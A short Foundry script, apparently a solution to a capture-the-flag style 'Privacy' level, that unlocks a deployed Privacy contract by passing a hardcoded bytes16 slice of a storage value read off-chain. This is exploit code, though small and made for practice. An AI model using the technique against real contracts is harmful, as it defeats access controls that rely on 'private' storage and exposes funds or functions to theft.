// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract PrivacySolution is Script {
    Privacy public privacy = Privacy(0x694fE01b04D5aA5ccb3a66b31aA7283E652BaDd2);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 data = 0x4548d4886a8a43ce96d028e78a0b5a084b520746de78cd076766007e1b7fb7f3;

        console.log("Before Contract Locked : ", privacy.locked());

        privacy.unlock(bytes16(data));

        console.log("After Contract Locked : ", privacy.locked());

        vm.stopBroadcast();
    }
}